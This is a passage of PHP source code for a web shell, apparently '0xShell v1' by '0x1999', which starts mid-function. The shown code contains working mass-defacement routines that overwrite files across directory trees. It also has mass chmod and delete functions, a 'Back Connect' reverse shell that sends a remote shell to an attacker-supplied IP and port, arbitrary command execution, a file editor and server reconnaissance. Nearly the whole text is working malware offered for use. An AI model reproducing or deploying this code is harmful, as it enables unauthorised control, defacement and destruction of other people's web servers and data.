            fclose($handle);  } }

    function gass(){
        global $dirr , $index ;
        chdir($dirr);
        $me = str_replace(dirname(__FILE__).'/','',__FILE__);
        $files = scandir($dirr) ;
        $notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
        sort($files);
        $n = 0 ;
        foreach ($files as $file){
            if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
                echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
                edit_file($file,$index);
                flush();
                $n = $n +1 ;
                } 
                }
                echo "<br>";
                echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
                    }
    function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
            }

            closedir($dh);
            return $files;
        }
    }
    function gass_all(){
        global $index ;
        $dirrall=$_POST['d_dir'];
        foreach (ListFiles($dirrall) as $key=>$file){
            $file = str_replace('//',"/",$file);
            echo "<center><strong>$file</strong> ===>";
            edit_file($file,$index);
            flush();
        }
        $key = $key+1;
    echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
    function chmod_all(){
        $chmod=$_POST['chmod'];
        $dirrall=$_POST['d_dir'];
        foreach (ListFiles($dirrall) as $key=>$file){
            $file = str_replace('//',"/",$file);
            echo "<center><strong>$file</strong> ===>";
            chmod($file,$chmod);
            flush();
        }
        $key = $key+1;
    echo "<center><br><h3>$key telah ngentu chmod disini</h3></center><br>"; }
    function sabun_massal($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=lime>DONE</font>] $lokasi<br>";
                            file_put_contents($lokasi, $isi_script);
                            $idx = sabun_massal($dirc,$namafile,$isi_script);
                        }
                    }
                }
            }
        }
    }
    if($_POST['mass'] == 'onedir') {
        echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
        $ini="http://";
        $mainpath=$_POST[d_dir];
        $file=$_POST[d_file];
        $dir=opendir("$mainpath");
        $code=base64_encode($_POST[script]);
        $indx=base64_decode($code);
        while($row=readdir($dir)){
        $start=@fopen("$row/$file","w+");
        $finish=@fwrite($start,$indx);
        if ($finish){
            echo"$ini$row/$file\n";
            }
        }
        echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
        $mainpath=$_POST[d_dir];$file=$_POST[d_file];
        $dir=opendir("$mainpath");
        $code=base64_encode($_POST[script]);
        $indx=base64_decode($code);
        while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
        $finish=@fwrite($start,$indx);
        if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
        }

    }
    elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
    elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
    elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
    elseif($_POST['mass'] == 'chmodkabeh') { chmod_all(); }
    elseif($_POST['mass'] == 'massdeface') {
        echo "<div style='margin: 5px auto; padding: 5px'>";
        sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
        echo "</div>";  }
    else {
        echo "
        <center><font style='text-decoration: underline;'>
        Select Type:<br>
        </font>
        <select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"onedir\">Mass Deface 1 Dir</option>
        <option value=\"massdeface\">Mass Deface ALL Dir</option>
        <option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
        <option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
        <option value=\"chmodkabeh\">Chmod Massal</option>
        <option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
        <font style='text-decoration: underline;'>Folder:</font><br>
        <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
        <font style='text-decoration: underline;'>Filename:</font><br>
        <input type='text' name='d_file' value='0x.php' style='width: 450px;' height='10'><br>
        <font style='text-decoration: underline;'>Index File:</font><br>
        <textarea name='script' style='width: 450px; height: 200px;'>Hacked By 0x1999</textarea><br>
        <input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
        </form></center>";
        }
    }
elseif(isset($_GET['do']) && ($_GET['do'] == 'bc')){	
	echo '
  <div id="back">
            <h2>Back Connect</h2>
            <p>Back connect will allow you to enter system commands remotely.</p>
            <p>
            <table>
				<form action="" method="post">
				<tr ><td>IP Address: </td><td><input type="textbox" name="ip" style="border:1px solid #5C7296; color: #5C7296;background-color:#1d1d1d;font-size:13px;"></td></tr>
				<tr ><td>Port: </td><td><input type="textbox" name="port" style="border:1px solid #5C7296; color: #5C7296;background-color:#1d1d1d;font-size:13px;"></td></tr>
				<tr ><td><input type="submit" name="bind" value="Open Connection" style="border:1px solid #5C7296; color: #5C7296;background-color:#1d1d1d;font-size:13px;"></td></tr>
				</form>
				</table>';
        if(isset($_POST['bind']))
					{
            echo "<p>Attempting Connection...</p>";
            $ip = $_POST['ip'];
            $port = $_POST['port'];
            $sockfd = fsockopen($ip , $port , $errno, $errstr );
            if($errno != 0){
              echo "<font color='red'>$errno : $errstr</font>";
            } else if (!$sockfd)  {
              $result = "<p>Unexpected error has occured, connection may have failed.</p>";
            } else {
              fputs ($sockfd ,"
                \n{################################################################}
                \n..:: 0xShell v1 - Coded By 0x1999 ::..
                \n
                \n=> Backconnect 
                \n=> Back 
                \n
                \n{################################################################}\n\n");
              $dir = shell_exec("pwd");
              $sysinfo = shell_exec("uname -a");
              $time = Shell_exec("time");
              $len = 1337;
              fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
              while(!feof($sockfd)){ $cmdPrompt = '[0x]#:> ';
              fputs ($sockfd , $cmdPrompt );
              $command= fgets($sockfd, $len);
              fputs($sockfd , "\n" . shell_exec($command) . "\n\n");
            }
            fclose($sockfd);
            }
          }
		echo "</p></div>";

}elseif(isset($_GET['act']) && ($_GET['act'] == 'edit')) {

		if(isset($_POST['save'])){
			$file = $_POST['saveas'];
			$content = magicboom($_POST['content']);
			if($filez = @fopen($file,"w")){
				$time = date("d-M-Y H:i",time());
				if(@fwrite($filez,$content)) $msg = "file saved <span class=\"gaya\">@</span> ".$time;
				else $msg = "failed to save";
				@fclose($filez);
			}
			else $msg = "permission denied";
		}
		if(!isset($file)) $file = $_GET['file'];
		if($filez = @fopen($file,"r")){
			$content = "";
			while(!feof($filez)){
				$content .= htmlentities(str_replace("''","'",fgets($filez)));
			}
			@fclose($filez);
		}
	?>
		<form action="" method="post">
			<table class="cmdbox">
				<tr>
					<td colspan="2">
						<textarea class="output" name="content">
<?php echo $content; ?>
</textarea>
						<tr>
							<td colspan="2">Save as <input id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /> &nbsp;
								<?php echo $msg; ?>
							</td>
						</tr>
			</table>
		</form>
		<?php
}
elseif(isset($_GET['do']) && ($_GET['do'] == 'serverinfo')){
	
  $s_safemode = ini_get("safe_mode");
  if($s_safemode = TRUE){$s_safemode = "<span class='enabled'>[ON";}else{$s_safemode = "<span class='disabled'>[OFF"; }
  if(extension_loaded('curl')){$curls="<span class='enabled'>[ON]</span>";}else{$curls="<span class='disabled'>[OFF]</span>";}
	echo "Server Port: ".$_SERVER['SERVER_PORT']."<br /><br />HTTP Connection: ".$_SERVER['HTTP_CONNECTION']."<br /><br />Operating System: ".php_uname()."<br /><br />";
	if(get_magic_quotes_gpc()){echo "Magic Quotes: <span class='enabled'>[ENABLED]</span><br /><br />";}else{echo "Magic Quotes: <span class='disabled'>[DISABLED]</span><br /><br />";}
	echo "PHP Version: ".phpversion()."<br /><br />Safe Mode: ".$s_safemode."]</span><br /><br />Curl: ".$curls."<br /><br />Accept Encoding:  ".$_SERVER['HTTP_ACCEPT_ENCODING']."<br /><br />Admin: ".$_SERVER['SERVER_ADMIN']."<br /><br /><strong>Disabled Functions: </strong>";
	if(!empty($disabled)){
	foreach($disabled as $functionsdis){
		echo $functionsdis.", ";
	}
	}else{
		echo "none";
	}
	echo "<br /><br /><strong>/etc/passwd: </strong>";
	if(is_readable("/home/etc/passwd")){
		echo "<span style='color:green;'>Readable</span>";
	}else{
		echo "<span style='color:red;'>Unreadable</span>";
	}
}elseif(isset($_GET['do']) && ($_GET['do'] == 'cmd')) {
    if($_POST['do_cmd']) {
        echo "<textarea class='area' rows='15' cols='60'>".exe($_POST['cmd'])."</textarea>";
    }
}elseif(isset($_GET['do']) && ($_GET['do'] == 'about')){
	
	echo "
		<h4>Information</h4>
		<p>$shell_name v$shell_version Ngelu Edition - coded by 0x1999.</p>";

		?>
			<ul>
				<li>Appearance C6 Shell.</li>
				<li>File Manager By IndoXploit.</li>
				<li>Thanks.</li>
			</ul>
			<br /><br />
			<?php
}else{
function GetFileSize($file){
	if(!is_dir($file))
		return round(filesize($file) / 1024, 2) . " Kb";
	else
		return "Not Availible";
}

function LastModified($file){
		return date("F d Y g:i:s", filemtime("$file"));}

////////////

    if(is_dir($dir) == true) {
        echo '<table  cellspacing="0" cellpadding="0"><tr><td class="TableHeader_Name"> FileName</td><td class="TableHeader">Filetype</a></td><td class="TableHeader">Size</td><td class="TableHeader">Permisions</td><td class="TableLast">Last Modified</td><td class="TableHeaderoptions"> Options</td></tr>';
        $scandir = scandir($dir);
        foreach($scandir as $dirx) {
            $dtype = @filetype("$dir/$dirx");
            $dtime = date("F d Y g:i:s", @filemtime("$dir/$dirx"));
            if(!is_dir("$dir/$dirx")) continue;
            if($dirx === '..') {
                $href = dirname($dir);
            } elseif($dirx === '.') {
                $href = $dir;
            } else {
                $href = $dir.'/'.$dirx;
            }
            if($dirx == '.') {
                $act_dir = "<span id=\"titik1\">
			<a href='?act=edit&dir=$dir&file=$dir/newfile.php'>newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span>
			<form action=\"?act=newfolder&dir=$dir\" method=\"post\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">

			<input class=\"inputz\" style=\"width:130px;\" type=\"text\" name=\"newfolder\" placeholder=\"new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"new_save_folder\" style=\"width:35px;\" value=\"Go !\" />
			</form>";
                }
				elseif($dirx == '..')
				{
					$act_dir="<span id=\"titik2\"><a href='?act=edit&dir=$dir&file=$dir/newfile.php'>newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span>
			<form action=\"?act=newfolder&dir=$dir\" method=\"post\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			
			<input class=\"inputz\" style=\"width:130px;\" type=\"text\" name=\"newfolder\" placeholder=\"new_folder\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"new_save_folder\" style=\"width:35px;\" value=\"Go !\" />
			</form>";
				}
				else {
                $act_dir = "<a href=\"javascript:tukar('".clearspace($dirx)."_link','".clearspace($dirx)."_form');\">rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
            }
            echo "<tr class='filetr'>";
            echo "<td class='td_home'><a id=\"".clearspace($dirx)."_link\"  href='?dir=".$href."'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAFUSURBVDiNpZK9SgNBFIXPvXNndjcRopX4U4kWVr5AChU7H8BSfItAHkB9CXsrW0GwEQtRwVKMRtAU8ZcYWaNmM2OxqyyiYZdcGIaZ4Z77MeeQcw6DFA/UDUAAYHHj8hOATj9oRSe2Z1f2KjP1fgLknMPS5lW0Vi4pZopvHXDW+IhOr99gXTzkr9qvTBMtrNd8AsLVcomZKDP61kELihGIJ9QBgO2jdsIE/Jb5OacGFAwDQEeMEOZnh1EqMChtSB8a64BW2MNh7QVihCGKcNHswmZ0lAkYHxF4QhBPCKIYRU9l605KmGCEIUYztCYMBfkEjGZ4OiHwRQF+vkQG+ptACIFREJVPQAvFf+BrjoyQ+CZfqq118DRFEhjebbbel6dGiyTqf+vSrkaRQ/0utL7mHXl9vq+eP3Unbh/H5gDKiOF67YebY0dSJcRBm0z2rFl2yWp8AVDIW32da7pLAAAAAElFTkSuQmCC'>  $dirx</a>



<form method=\"post\" id=\"".clearspace($dirx)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"oldname\" value=\"".$dirx."\" style=\"margin:0;padding:0;\" />
			<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"fol_rename\" value=\"".$dirx."\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"dir_rename\" value=\"rename\" />
			<input class=\"inputzbut\" type=\"button\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($dirx)."_form','".clearspace($dirx)."_link');\" />
			</form>




			</td>
			
			
			
			";
            echo "<td class='td_home'><center>$dtype</center></td>";
            echo "<td class='td_home'><center>-</center></th>";
            echo "<td class='td_home'><center>".w("$dir/$dirx",permissions("$dir/$dirx"))."</center></td>";
            echo "<td class='td_home'>$dtime</td>";
            echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
        }
        echo "</tr>";
        foreach($scandir as $file) {
            $ftype = filetype("$dir/$file");
            $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
            $size = filesize("$dir/$file")/1024;
            $size = round($size,3);
            if($size > 1024) {
                $size = round($size/1024,2). 'MB';
            } else {
                $size = $size. 'KB';
            }
            if(!is_file("$dir/$file")) continue;
            echo "<tr class='filetr'>";
            echo "<td class='td_home'>
			
			
			
			<a id=\"".clearspace($file)."_link\" href='?act=view&dir=$dir&file=$dir/$file'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='>  $file</a>
		
	<form method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"rename\" value=\"".$file."\" />
		<input type=\"submit\" name=\"do_rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"button\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($file)."_form','".clearspace($file)."_link');\" />
	</form>
			
			
			
			";
            echo "<td class='td_home'><center>$ftype</center></td>";
            echo "<td class='td_home'><center>$size</center></td>";
            echo "<td class='td_home'><center>".w("$dir/$file",permissions("$dir/$file"))."</center></td>";
            echo "<td class='td_home'>$ftime</td>";
            echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
        }
        echo "</tr></table>";
    } else {
        echo "<font color=red>can't open directory</font>";
    }
    

		
	?></table>
				<div style="background:#282828;border-bottom-right-radius:4px;-moz-border-bottom-right-radius:4px;-webkit-border-bottom-right-radius:4px;border-bottom-left-radius:4px;-moz-border-bottom-left-radius:4px;-webkit-border-bottom-left-radius:4px;height:25px;margin:0px 0px 10px 0px;width:1000px;">
					<center>
						Copyright  2017 - 0x1999 </div>				</body>

	</html>

				<?php
	
}
@ob_flush();		
?>

